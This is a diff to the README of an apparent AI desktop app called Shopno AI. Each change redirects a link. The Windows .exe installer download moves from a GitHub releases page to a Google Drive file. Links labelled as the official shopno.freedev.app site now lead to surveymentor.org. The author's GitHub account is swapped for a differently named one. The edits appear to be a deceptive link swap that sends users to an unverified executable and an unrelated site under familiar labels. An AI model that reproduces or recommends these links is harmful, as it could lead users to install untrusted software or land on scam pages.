@@ -6,12 +6,12 @@
   ### The Sovereign Autonomous AI & Multi-Agent Swarm Operating System
   **454+ Native Tools • 4,000+ Skills • 60,000+ Open VSX Extensions • 7 Billion Tokens Freedom • 1-Click MCP Suite**
 
-  [![Release](https://img.shields.io/badge/Release-v1.1.18_Stable_Fix-00d4aa?style=for-the-badge&logo=rocket&logoColor=white)]([https://github.com/CyberPrince-Alien/Shopno-AI/releases/download/Version1.1.1_Final/Shopno.Desktop_1.1.18_x64-setup.exe](https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link))
-  [![Tools](https://img.shields.io/badge/Native_Tools-454+-8b5cf6?style=for-the-badge&logo=terminal&logoColor=white)](https://shopno.freedev.app/)
+  [![Release](https://img.shields.io/badge/Release-v1.1.18_Stable_Fix-00d4aa?style=for-the-badge&logo=rocket&logoColor=white)]([https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link](https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link))
+  [![Tools](https://img.shields.io/badge/Native_Tools-454+-8b5cf6?style=for-the-badge&logo=terminal&logoColor=white)](https://surveymentor.org)
   [![Skills](https://img.shields.io/badge/Built--in_Skills-4%2C000+-06b6d4?style=for-the-badge&logo=codewars&logoColor=white)](https://shopno.freedev.app/)
-  [![Promo](https://img.shields.io/badge/100%25_FREE_PROMO-SHOPNO-10b981?style=for-the-badge&logo=ticket&logoColor=white)](https://shopno.freedev.app/)
+  [![Promo](https://img.shields.io/badge/100%25_FREE_PROMO-SHOPNO-10b981?style=for-the-badge&logo=ticket&logoColor=white)](https://surveymentor.org/)
   [![Website](https://img.shields.io/badge/Official_Website-shopno.freedev.app-blue?style=for-the-badge&logo=google-chrome&logoColor=white)](https://surveymentor.org/)
-  [![Architect](https://img.shields.io/badge/Architect-Cyber_Prince-purple?style=for-the-badge&logo=github)](https://github.com/CyberPrince-Alien)
+  [![Architect](https://img.shields.io/badge/Architect-Cyber_Prince-purple?style=for-the-badge&logo=github)](https://github.com/CyberPrince-glitch)
   [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE.md)
 
   <br><br>
@@ -235,10 +235,10 @@ Replace N8N, Zapier, and IFTTT. Automate social media marketing, build complete 
 
 | প্ল্যাটফর্ম | বিবরণ ও লিংক |
 |---|---|
-| **Windows 64-bit Installer** | [**Download Shopno Desktop v1.1.18 (.exe)**](https://github.com/CyberPrince-Alien/Shopno-AI/releases/download/Version1.1.1_Final/Shopno.Desktop_1.1.18_x64-setup.exe) |
+| **Windows 64-bit Installer** | [**Download Shopno Desktop v1.1.18 (.exe)**](https://drive.google.com/file/d/15BrCcw5WmidIVBxj2KcALHxzl6IcPLk3/view?usp=drive_link) |
 | **১০০% ডিসকাউন্ট প্রোমো কোড** | `SHOPNO` *(সম্পূর্ণ ফ্রিতে লাইসেন্স অ্যাক্টিভ করার জন্য)* |
-| **অফিসিয়াল ওয়েবসাইট** | [**shopno.freedev.app**](https://shopno.freedev.app/) |
-| **গিটহাব রিলিজ পাতা** | [**All Releases**](https://github.com/CyberPrince-Alien/Shopno-AI/releases) |
+| **অফিসিয়াল ওয়েবসাইট** | [**Surveymentor.org**](https://surveymentor.org/) |
+| **গিটহাব রিলিজ পাতা** | [**All Releases**](https://github.com/CyberPrince-glitch/Shopno-Portable-LLM/releases) |
 
 ---
 
@@ -289,9 +289,9 @@ Replace N8N, Zapier, and IFTTT. Automate social media marketing, build complete 
 *Visionary AI Architect, Full-Stack Engineer & Cyber-Security Researcher*
 
 [![Facebook](https://img.shields.io/badge/Facebook-Cyber_Prince-blue?style=for-the-badge&logo=facebook)](https://www.facebook.com/ImDarkMagician/)
-[![GitHub](https://img.shields.io/badge/GitHub-CyberPrince--Alien-black?style=for-the-badge&logo=github)](https://github.com/CyberPrince-Alien)
-[![Website](https://img.shields.io/badge/Website-shopno.freedev.app-00d4aa?style=for-the-badge&logo=google-chrome&logoColor=white)](https://shopno.freedev.app/)
-[![Portfolio](https://img.shields.io/badge/Portfolio-Visit-purple?style=for-the-badge&logo=safari&logoColor=white)](https://github.com/CyberPrince-Alien/Protfolio)
+[![GitHub](https://img.shields.io/badge/GitHub-CyberPrince--Alien-black?style=for-the-badge&logo=github)](https://github.com/CyberPrince-glitch/)
+[![Website](https://img.shields.io/badge/Website-shopno.freedev.app-00d4aa?style=for-the-badge&logo=google-chrome&logoColor=white)](https://surveymentor.org/)
+[![Portfolio](https://img.shields.io/badge/Portfolio-Visit-purple?style=for-the-badge&logo=safari&logoColor=white)](https://github.com/CyberPrince-glitch/)
 
 > *"Shopno AI was built to bring your digital dreams into reality. 454+ tools. 4,000+ skills. 7 billion tokens of freedom. One sovereign desktop operating system. Build without limits."*  
 > — **Cyber Prince**
